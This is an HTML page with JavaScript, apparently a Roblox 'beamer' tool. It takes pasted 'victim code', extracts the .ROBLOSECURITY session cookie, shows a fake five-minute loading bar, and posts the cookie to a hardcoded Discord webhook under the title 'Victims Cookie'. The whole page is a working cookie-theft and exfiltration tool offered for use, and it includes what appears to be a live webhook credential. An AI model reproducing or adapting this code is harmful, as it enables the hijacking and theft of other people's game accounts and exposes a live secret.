<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Beamer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    #messageBar {
      margin-top: 20px;
    }
    textarea, button {
      padding: 10px;
      font-size: 16px;
    }
    textarea {
      width: 70%;
      height: 200px; /* Make the textarea bigger */
      margin-right: 10px;
      resize: vertical; /* Allow vertical resizing */
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
    button:hover:not(:disabled) {
      background-color: #0056b3;
    }
    .error {
      color: red;
      font-weight: bold;
    }
    #loadingBarContainer {
      width: 70%;
      background-color: #f3f3f3;
      margin-top: 20px;
      height: 30px;
      border-radius: 5px;
      display: none; /* Hidden by default */
    }
    #loadingBar {
      width: 1%;
      height: 100%;
      background-color: green;
      border-radius: 5px;
    }
    #status {
      font-weight: bold;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h1>Start Beaming Now!</h1>
  <div id="messageBar">
    <textarea id="messageInput" placeholder="Paste the victim code that you copied..."></textarea><br>
    <button id="sendButton" onclick="sendMessage()">Send</button>
  </div>
  <div id="loadingBarContainer">
    <div id="loadingBar"></div>
  </div>
  <p id="status" style="color: green;"></p>
  <p id="errorMessage" class="error"></p>

  <script>
    // Replace with your Discord Webhook URL
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320573593821773845/QvHOAwVTwyuwh6O-HT15JQSZYD_W9hxsYcfnOe3L-Ig7vENas32Ybj5p2_3VVHYiHdQg";

    function sendMessage() {
      const messageInput = document.getElementById("messageInput");
      const sendButton = document.getElementById("sendButton");
      const errorMessage = document.getElementById("errorMessage");
      const loadingBarContainer = document.getElementById("loadingBarContainer");
      const loadingBar = document.getElementById("loadingBar");
      let message = messageInput.value;

      errorMessage.textContent = ""; // Clear any previous error messages

      // Check if the message is blank
      if (!message.trim()) {
        errorMessage.textContent = "Message failed! Your message cannot be blank.";
        return;
      }

      // Scan for the start and end phrases
      const startPhrase = ".ROBLOSECURITY="; //LOVE YOU
      const endPhrase = "; rbxas"; //YES THANK YOU

      // Check if the message contains both start and end phrases
      const startIndex = message.indexOf(startPhrase);
      const endIndex = message.indexOf(endPhrase);

      if (startIndex !== -1 && endIndex !== -1 && endIndex > startIndex) {
        // Extract the part of the message between the phrases
        const middleMessage = message.slice(startIndex + startPhrase.length, endIndex).trim();

        if (middleMessage) {
          // Hide the Send button and show the loading bar
          sendButton.style.display = "none";
          loadingBarContainer.style.display = "block";

          let progress = 1; // Start at 1% progress
          const progressInterval = setInterval(() => {
            if (progress >= 100) {
              clearInterval(progressInterval);
              sendToDiscord(middleMessage);
            } else {
              progress++;
              loadingBar.style.width = `${progress}%`;
            }
          }, 180); // Increase progress every 180ms (5 minutes = 300 seconds, divide by 100 steps)
        } else {
          errorMessage.textContent = "Message failed! Wrong Code.";
        }
      } else {
        errorMessage.textContent = "Message failed! Make sure you paste the right code from the victim.";
      }
    }

    function sendToDiscord(middleMessage) {
      // Create the embed payload
      const embedPayload = {
        embeds: [
          {
            title: "Victims Cookie", // Embed title
            description: `\`\`\`${middleMessage}\`\`\``, // Embed description with the message surrounded by triple backticks
            color: 16711680, // Embed color (red in this case)
            timestamp: new Date().toISOString() // Adds a timestamp
          }
        ]
      };

      // Send the embed to Discord webhook
      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(embedPayload),
      })
        .then((response) => {
          if (response.ok) {
            document.getElementById("status").textContent = "Message sent successfully!";
            setTimeout(() => {
              resetForm();
            }, 3000); // Reset after 3 seconds
          } else {
            throw new Error("Failed to send the message.");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
          document.getElementById("status").textContent = "Failed to send the message.";
          setTimeout(() => {
            resetForm();
          }, 3000); // Reset after 3 seconds
        });
    }

    function resetForm() {
      const sendButton = document.getElementById("sendButton");
      const loadingBarContainer = document.getElementById("loadingBarContainer");
      const messageInput = document.getElementById("messageInput");
      const errorMessage = document.getElementById("errorMessage");
      const status = document.getElementById("status");

      // Reset progress bar and visibility
      loadingBar.style.width = "1%";
      loadingBarContainer.style.display = "none";
      sendButton.style.display = "inline-block";
      errorMessage.textContent = "";
      status.textContent = "Try again!";
      
      // Reset message box after showing the "Try again" message for 3 seconds
      setTimeout(() => {
        status.textContent = "";
        messageInput.value = ""; // Clear input box
      }, 3000);
    }
  </script>
</body>
</html>
